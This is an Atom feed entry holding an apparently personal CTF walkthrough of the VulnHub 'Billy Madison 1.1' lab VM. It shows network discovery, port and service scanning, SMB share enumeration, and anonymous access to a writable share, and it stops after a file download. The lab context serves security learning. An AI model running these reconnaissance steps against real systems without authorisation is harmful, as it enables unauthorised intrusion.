<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: vulnhub | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2017-03-25T03:11:43-04:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[VulnHub] Billy Madison 1.1]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2017/01/08/vulnhub-billy-madison-1-dot-1/"/>
    <updated>2017-01-08T01:55:38-05:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2017/01/08/vulnhub-billy-madison-1-dot-1</id>
    <content type="html"><![CDATA[<p>&ldquo;Objective: The primary objective of the VM is to figure out how Eric took over the machine and then undo his changes so you can recover Billy&rsquo;s 12th grade final project. You will probably need to root the box to complete this objective.&rdquo; &ndash; <a href="https://www.vulnhub.com/author/brian-johnson,256/">Brian Johnson</a></p>

<p>More information and OVA file download please check <a href="https://www.vulnhub.com/entry/billy-madison-11,161/">here</a>.</p>

<!-- more -->


<h2>Attacker &amp; Target</h2>

<p>Attacker: Kali2 Linux (<em>10.1.1.128/24</em>)</p>

<p>Target: Billy Madison 1.1 (<em>10.1.1.129/24</em>)</p>

<h2>Tools</h2>

<p>All the tools used here can be found in Kali Linux</p>

<ul>
<li><a href="http://linux.die.net/man/1/arp-scan">arp-scan</a></li>
<li><a href="https://github.com/robertdavidgraham/masscan">masscan</a></li>
<li><a href="https://nmap.org/">nmap</a></li>
<li><a href="https://cirt.net/Nikto2">nikto</a></li>
<li><a href="http://linux.die.net/man/1/nc">nc</a></li>
<li><a href="https://www.mozilla.org/en-US/firefox/new/">firefox</a></li>
<li><a href="https://portswigger.net/burp/">burp suite</a></li>
<li><a href="https://www.wireshark.org/">wireshark</a></li>
<li><a href="http://www.sno.phy.queensu.ca/~phil/exiftool/">exiftool</a></li>
<li><a href="https://nmap.org/ncrack/">ncrack</a></li>
<li><a href="https://www.aircrack-ng.org/">aircrack-ng</a></li>
<li><a href="https://github.com/lvaccaro/truecrack">truecrack</a></li>
<li><a href="https://veracrypt.codeplex.com/">veracrypt</a></li>
</ul>


<h2>Walkthrough</h2>

<p>Using <code>arp-scan</code> as routine to detect the target&rsquo;s IP address.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# arp-scan -l
</span><span class='line'>Interface: eth0, datalink <span class="nb">type</span>: EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>
</span><span class='line'>Starting arp-scan 1.9 with <span class="m">256</span> hosts <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://www.nta-monitor.com/tools/arp-scan/&quot;</span>&gt;http://www.nta-monitor.com/tools/arp-scan/&lt;/a&gt;<span class="o">)</span>
</span><span class='line'>10.1.1.1    00:50:56:c0:00:08   VMware, Inc.
</span><span class='line'>10.1.1.2    00:50:56:f1:61:7e   VMware, Inc.
</span><span class='line'>10.1.1.129  00:0c:29:84:da:45   VMware, Inc.
</span><span class='line'>10.1.1.250  00:50:56:f9:1b:7d   VMware, Inc.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;4 packets received by filter, <span class="m">0</span> packets dropped by kernel
</span><span class='line'>Ending arp-scan 1.9: <span class="m">256</span> hosts scanned in 2.425 seconds <span class="o">(</span>105.57 hosts/sec<span class="o">)</span>. <span class="m">4</span> responded
</span></code></pre></td></tr></table></div></figure></p>

<p><code>10.1.1.129</code> is our Target!</p>

<p>Then run <code>masscan</code> to detect opening ports on the target (masscan is much faster than nmap when doing a full ports scan, so here I use it to make a full scan and then use nmap to do a deep scan on target ports).</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# masscan -p1-65535 10.1.1.129/32 <span class="p">&amp;</span>ndash<span class="p">;</span><span class="nv">rate</span><span class="o">=</span>10000&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting masscan 1.0.3 <span class="o">(</span>&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;http://bit.ly/14GZzcT&quot;</span>&gt;http://bit.ly/14GZzcT&lt;/a&gt;<span class="o">)</span> at 2016-12-12 11:05:27 GMT
</span><span class='line'> <span class="p">&amp;</span>ndash<span class="p">;</span> forced options: -sS -Pn -n <span class="p">&amp;</span>ndash<span class="p">;</span>randomize-hosts -v <span class="p">&amp;</span>ndash<span class="p">;</span>send-eth
</span><span class='line'>Initiating SYN Stealth Scan
</span><span class='line'>Scanning <span class="m">1</span> hosts <span class="o">[</span><span class="m">65535</span> ports/host<span class="o">]</span>
</span><span class='line'>Discovered open port 80/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 23/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 139/tcp on 10.1.1.129                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 69/tcp on 10.1.1.129                                    &lt;br/&gt;
</span><span class='line'>Discovered open port 445/tcp on 10.1.1.129                                   &lt;br/&gt;
</span><span class='line'>Discovered open port 2525/tcp on 10.1.1.129                                  &lt;br/&gt;
</span><span class='line'>Discovered open port 22/tcp on 10.1.1.129 &lt;br/&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> turncated <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.129
</span><span class='line'>Host is up <span class="o">(</span>0.00032s latency<span class="o">)</span>.
</span><span class='line'>PORT     STATE SERVICE     VERSION
</span><span class='line'>22/tcp   open  tcpwrapped
</span><span class='line'>23/tcp   open  telnet?
</span><span class='line'>69/tcp   open  http        BaseHTTPServer
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-generator: WordPress 1.0
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;/em&gt;  Supported Methods: HEAD GET POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-server-header: MadisonHotelsWordpress
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-title: Welcome <span class="p">|</span> Just another WordPress site
</span><span class='line'>80/tcp   open  http        Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
</span><span class='line'><span class="p">|</span> http-methods:
</span><span class='line'><span class="p">|</span>&lt;em&gt;  Supported Methods: GET HEAD POST OPTIONS
</span><span class='line'><span class="p">|</span>&lt;/em&gt;http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span><span class='line'><span class="p">|</span>&lt;em&gt;http-title: Oh nooooooo!
</span><span class='line'>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span><span class='line'>445/tcp  open  netbios-ssn Samba smbd 4.3.9-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
</span><span class='line'>2525/tcp open  smtp
</span><span class='line'><span class="p">|</span> smtp-commands: BM, 8BITMIME, AUTH LOGIN, Ok,
</span><span class='line'><span class="p">|</span>&lt;/em&gt; SubEthaSMTP null on BM Topics: HELP HELO RCPT MAIL DATA AUTH EHLO NOOP RSET VRFY QUIT STARTTLS For more info use <span class="p">&amp;</span>ldquo<span class="p">;</span>HELP &lt;topic&gt;<span class="p">&amp;</span>rdquo<span class="p">;</span>. End of HELP info
</span><span class='line'><span class="m">2</span> services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org/cgi-bin/submit.cgi?new-service&quot;</span>&gt;https://nmap.org/cgi-bin/submit.cgi?new-service&lt;/a&gt; :
</span><span class='line'><span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
</span><span class='line'>SF-Port23-TCP:V<span class="o">=</span>7.31%I<span class="o">=</span>7%D<span class="o">=</span>12/12%Time<span class="o">=</span>584E8537%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NUL
</span><span class='line'>SF:L,E6,<span class="p">&amp;</span>ldquo<span class="p">;</span><span class="se">\n\n</span>*****<span class="se">\x</span>20HAHAH!<span class="se">\x</span>20You<span class="p">&amp;</span>rsquo<span class="p">;</span>re<span class="se">\x</span>20banned<span class="se">\x</span>20for<span class="se">\x</span>20a<span class="se">\x</span>20while
</span><span class='line'>SF:,<span class="se">\x</span>20Billy<span class="se">\x</span>20Boy!<span class="se">\x</span>20<span class="se">\x</span>20By<span class="se">\x</span>20the<span class="se">\x</span>20way,<span class="se">\x</span>20I<span class="se">\x</span>20caught<span class="se">\x</span>20you<span class="se">\x</span>20tr
</span><span class='line'>SF:ying<span class="se">\x</span>20to<span class="se">\x</span>20hack<span class="se">\x</span>20my<span class="se">\x</span>20wifi<span class="se">\x</span>20-<span class="se">\x</span>20but<span class="se">\x</span>20the<span class="se">\x</span>20joke<span class="p">&amp;</span>rsquo<span class="p">;</span>s<span class="se">\x</span>20on<span class="se">\x</span>20
</span><span class='line'>SF:you!<span class="se">\x</span>20I<span class="se">\x</span>20don<span class="p">&amp;</span>rsquo<span class="p">;</span>t<span class="se">\x</span>20use<span class="se">\x</span>20ROTten<span class="se">\x</span>20passwords<span class="se">\x</span>20like<span class="se">\x</span>20rkfpuzrahng
</span><span class='line'>SF:vat<span class="se">\x</span>20anymore!<span class="se">\x</span>20Madison<span class="se">\x</span>20Hotels<span class="se">\x</span>20is<span class="se">\x</span>20as<span class="se">\x</span>20good<span class="se">\x</span>20as<span class="se">\x</span>20MINE!
</span><span class='line'>SF:!!!<span class="se">\x</span>20*****<span class="se">\n\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span><span class="p">;</span>
</span><span class='line'><span class="o">==============</span>NEXT SERVICE FINGERPRINT <span class="o">(</span>SUBMIT INDIVIDUALLY<span class="o">)==============</span>
</span><span class='line'>SF-Port2525-TCP:V<span class="o">=</span>7.31%I<span class="o">=</span>7%D<span class="o">=</span>12/12%Time<span class="o">=</span>584E853D%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>N
</span><span class='line'>SF:ULL,1F,<span class="p">&amp;</span>ldquo<span class="p">;</span>220<span class="se">\x</span>20BM<span class="se">\x</span>20ESMTP<span class="se">\x</span>20SubEthaSMTP<span class="se">\x</span>20null<span class="se">\r\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,5A
</span><span class='line'>SF:,<span class="p">&amp;</span>ldquo<span class="p">;</span>220<span class="se">\x</span>20BM<span class="se">\x</span>20ESMTP<span class="se">\x</span>20SubEthaSMTP<span class="se">\x</span>20null<span class="se">\r\n</span>500<span class="se">\x</span>20Error:<span class="se">\x</span>20command
</span><span class='line'>SF:<span class="se">\x</span>20not<span class="se">\x</span>20implemented<span class="se">\r\n</span>500<span class="se">\x</span>20Error:<span class="se">\x</span>20bad<span class="se">\x</span>20syntax<span class="se">\r\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>%r<span class="o">(</span>Generi
</span><span class='line'>SF:cLines,4D,<span class="p">&amp;</span>ldquo<span class="p">;</span>220<span class="se">\x</span>20BM<span class="se">\x</span>20ESMTP<span class="se">\x</span>20SubEthaSMTP<span class="se">\x</span>20null<span class="se">\r\n</span>500<span class="se">\x</span>20Error:<span class="se">\x</span>
</span><span class='line'>SF:20bad<span class="se">\x</span>20syntax<span class="se">\r\n</span>500<span class="se">\x</span>20Error:<span class="se">\x</span>20bad<span class="se">\x</span>20syntax<span class="se">\r\n</span><span class="p">&amp;</span>rdquo<span class="p">;</span><span class="o">)</span>%r<span class="o">(</span>Help,13D,<span class="p">&amp;</span>ldquo<span class="p">;</span>220
</span><span class='line'>SF:<span class="se">\x</span>20BM<span class="se">\x</span>20ESMTP<span class="se">\x</span>20SubEthaSMTP<span class="se">\x</span>20null<span class="se">\r\n</span>214-SubEthaSMTP<span class="se">\x</span>20null<span class="se">\x</span>20on
</span><span class='line'>SF:<span class="se">\x</span>20BM<span class="se">\r\n</span>214-Topics:<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20HELP<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>
</span><span class='line'>SF:20<span class="se">\x</span>20<span class="se">\x</span>20HELO<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20RCPT<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\</span>
</span><span class='line'>SF:x20MAIL<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20DATA<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20AUTH
</span><span class='line'>SF:<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20EHLO<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20NOOP<span class="se">\r\n</span>214
</span><span class='line'>SF:-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20RSET<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20VRFY<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>
</span><span class='line'>SF:20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20QUIT<span class="se">\r\n</span>214-<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20<span class="se">\x</span>20STARTTLS<span class="se">\r\n</span>214-For<span class="se">\x</span>20mo
</span><span class='line'>SF:re<span class="se">\x</span>20info<span class="se">\x</span>20use<span class="se">\x</span>20<span class="se">\&quot;</span>HELP<span class="se">\x</span>20&lt;topic&gt;<span class="se">\&amp;</span>rdquo<span class="p">;</span>.<span class="se">\r\n</span>214<span class="se">\x</span>20End<span class="se">\x</span>20of<span class="se">\x</span>20HELP<span class="se">\</span>
</span><span class='line'>SF:x20info<span class="se">\r\n</span><span class="s2">&quot;);</span>
</span><span class='line'><span class="s2">MAC Address: 00:0C:29:84:DA:45 (VMware)</span>
</span><span class='line'><span class="s2">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span>
</span><span class='line'><span class="s2">Device type: general purpose</span>
</span><span class='line'><span class="s2">Running: OpenBSD 4.X</span>
</span><span class='line'><span class="s2">OS CPE: cpe:/o:openbsd:openbsd:4.4</span>
</span><span class='line'><span class="s2">OS details: OpenBSD 4.4</span>
</span><span class='line'><span class="s2">Network Distance: 1 hop</span>
</span><span class='line'><span class="s2">Service Info: Host: BM&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s2">&lt;p&gt;Host script results:</span>
</span><span class='line'><span class="s2">|&lt;em&gt;clock-skew: mean: 6s, deviation: 0s, median: 6s</span>
</span><span class='line'><span class="s2">| smb-os-discovery:</span>
</span><span class='line'><span class="s2">|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)</span>
</span><span class='line'><span class="s2">|   Computer name: bm</span>
</span><span class='line'><span class="s2">|   NetBIOS computer name: BM</span>
</span><span class='line'><span class="s2">|   Domain name:</span>
</span><span class='line'><span class="s2">|   FQDN: bm</span>
</span><span class='line'><span class="s2">|&lt;/em&gt;  System time: 2016-12-12T05:09:11-06:00</span>
</span><span class='line'><span class="s2">| smb-security-mode:</span>
</span><span class='line'><span class="s2">|   account_used: guest</span>
</span><span class='line'><span class="s2">|   authentication_level: user</span>
</span><span class='line'><span class="s2">|   challenge_response: supported</span>
</span><span class='line'><span class="s2">|&lt;em&gt;  message_signing: disabled (dangerous, but default)</span>
</span><span class='line'><span class="s2">|&lt;/em&gt;smbv2-enabled: Server supports SMBv2 protocol&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s2">&lt;p&gt;TRACEROUTE</span>
</span><span class='line'><span class="s2">HOP RTT     ADDRESS</span>
</span><span class='line'><span class="s2">1   0.32 ms 10.1.1.129&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="s2">&lt;p&gt;NSE: Script Post-scanning.</span>
</span><span class='line'><span class="s2">Initiating NSE at 06:09</span>
</span><span class='line'><span class="s2">Completed NSE at 06:09, 0.00s elapsed</span>
</span><span class='line'><span class="s2">Initiating NSE at 06:09</span>
</span><span class='line'><span class="s2">Completed NSE at 06:09, 0.00s elapsed</span>
</span><span class='line'><span class="s2">Post-scan script results:</span>
</span><span class='line'><span class="s2">| clock-skew:</span>
</span><span class='line'><span class="s2">|_  6s: Majority of systems scanned</span>
</span><span class='line'><span class="s2">Read data files from: /usr/bin/../share/nmap</span>
</span><span class='line'><span class="s2">OS and Service detection performed. Please report any incorrect results at &lt;a href=&quot;</span>https://nmap.org/submit/<span class="err">&quot;</span>&gt;https://nmap.org/submit/&lt;/a&gt; .
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 66.96 seconds
</span><span class='line'>           Raw packets sent: <span class="m">48</span> <span class="o">(</span>4.616KB<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">16</span> <span class="o">(</span>656B<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Well, from the result of nmap, there are multiple vectors/ports are interesting, and I choose to test <code>smb</code> first.</p>

<p>Then I use <code>nmap</code> with script <code>smb-enum-shares.nse</code> to enumerate shares.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap -v <span class="p">&amp;</span>ndash<span class="p">;</span>script smb-enum-shares.nse -p445 10.1.1.129&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Starting Nmap 7.31 <span class="o">(</span> &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&quot;https://nmap.org&quot;</span>&gt;https://nmap.org&lt;/a&gt; <span class="o">)</span> at 2016-12-12 06:26 EST
</span><span class='line'>NSE: Loaded <span class="m">1</span> scripts <span class="k">for</span> scanning.
</span><span class='line'>NSE: Script Pre-scanning.
</span><span class='line'>Initiating NSE at 06:26
</span><span class='line'>Completed NSE at 06:26, 0.00s elapsed
</span><span class='line'>Initiating ARP Ping Scan at 06:26
</span><span class='line'>Scanning 10.1.1.129 <span class="o">[</span><span class="m">1</span> port<span class="o">]</span>
</span><span class='line'>Completed ARP Ping Scan at 06:26, 0.04s elapsed <span class="o">(</span><span class="m">1</span> total hosts<span class="o">)</span>
</span><span class='line'>Initiating Parallel DNS resolution of <span class="m">1</span> host. at 06:26
</span><span class='line'>Completed Parallel DNS resolution of <span class="m">1</span> host. at 06:26, 0.00s elapsed
</span><span class='line'>Initiating SYN Stealth Scan at 06:26
</span><span class='line'>Scanning 10.1.1.129 <span class="o">[</span><span class="m">1</span> port<span class="o">]</span>
</span><span class='line'>Discovered open port 445/tcp on 10.1.1.129
</span><span class='line'>Completed SYN Stealth Scan at 06:26, 0.04s elapsed <span class="o">(</span><span class="m">1</span> total ports<span class="o">)</span>
</span><span class='line'>NSE: Script scanning 10.1.1.129.
</span><span class='line'>Initiating NSE at 06:26
</span><span class='line'>Completed NSE at 06:26, 13.32s elapsed
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.129
</span><span class='line'>Host is up <span class="o">(</span>0.00023s latency<span class="o">)</span>.
</span><span class='line'>PORT    STATE SERVICE
</span><span class='line'>445/tcp open  microsoft-ds
</span><span class='line'>MAC Address: 00:0C:29:84:DA:45 <span class="o">(</span>VMware<span class="o">)</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Host script results:
</span><span class='line'><span class="p">|</span> smb-enum-shares:
</span><span class='line'><span class="p">|</span>   account_used: guest
</span><span class='line'><span class="p">|</span>   EricsSecretStuff:
</span><span class='line'><span class="p">|</span>     Type: STYPE_DISKTREE
</span><span class='line'><span class="p">|</span>     Comment:
</span><span class='line'><span class="p">|</span>     Users: 0
</span><span class='line'><span class="p">|</span>     Max Users: &lt;unlimited&gt;
</span><span class='line'><span class="p">|</span>     Path: C:<span class="se">\h</span>ome<span class="se">\W</span>easelLaugh
</span><span class='line'><span class="p">|</span>     Anonymous access: READ/WRITE
</span><span class='line'><span class="p">|</span>     Current user access: READ/WRITE
</span><span class='line'><span class="p">|</span>   IPC<span class="nv">$:</span>
</span><span class='line'><span class="p">|</span>     Type: STYPE_IPC_HIDDEN
</span><span class='line'><span class="p">|</span>     Comment: IPC Service <span class="o">(</span>BM<span class="o">)</span>
</span><span class='line'><span class="p">|</span>     Users: 1
</span><span class='line'><span class="p">|</span>     Max Users: &lt;unlimited&gt;
</span><span class='line'><span class="p">|</span>     Path: C:<span class="se">\t</span>mp
</span><span class='line'><span class="p">|</span>     Anonymous access: READ/WRITE
</span><span class='line'><span class="p">|</span>_    Current user access: READ/WRITE&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;NSE: Script Post-scanning.
</span><span class='line'>Initiating NSE at 06:26
</span><span class='line'>Completed NSE at 06:26, 0.00s elapsed
</span><span class='line'>Read data files from: /usr/bin/../share/nmap
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.79 seconds
</span><span class='line'>           Raw packets sent: <span class="m">2</span> <span class="o">(</span>72B<span class="o">)</span> <span class="p">|</span> Rcvd: <span class="m">2</span> <span class="o">(</span>72B<span class="o">)</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Here I found that <code>EricsSecretStuff</code> can be access/write anonymously!</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# smbclient <span class="se">\\</span>10.1.1.129<span class="se">\E</span>ricsSecretStuff<span class="se">\</span>
</span><span class='line'>WARNING: The <span class="p">&amp;</span>ldquo<span class="p">;</span>syslog<span class="p">&amp;</span>rdquo<span class="p">;</span> option is deprecated
</span><span class='line'>Enter root<span class="p">&amp;</span>rsquo<span class="p">;</span>s password:
</span><span class='line'><span class="nv">Domain</span><span class="o">=[</span>WORKGROUP<span class="o">]</span> <span class="nv">OS</span><span class="o">=[</span>Windows 6.1<span class="o">]</span> <span class="nv">Server</span><span class="o">=[</span>Samba 4.3.9-Ubuntu<span class="o">]</span>
</span><span class='line'>smb: &gt; ls
</span><span class='line'>  .                                   D        <span class="m">0</span>  Mon Dec <span class="m">12</span> 17:03:27 2016
</span><span class='line'>  ..                                  D        <span class="m">0</span>  Sat Aug <span class="m">20</span> 14:56:45 2016
</span><span class='line'>  ._.DS_Store                        AH     <span class="m">4096</span>  Wed Aug <span class="m">17</span> 10:32:07 2016
</span><span class='line'>  ebd.txt                             N       <span class="m">35</span>  Mon Dec <span class="m">12</span> 17:03:27 2016
</span><span class='line'>  .DS_Store                          AH     <span class="m">6148</span>  Wed Aug <span class="m">17</span> 10:32:12 2016&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;    <span class="m">30291996</span> blocks of size 1024. <span class="m">25919088</span> blocks available
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;smb: &gt; get ebd.txt
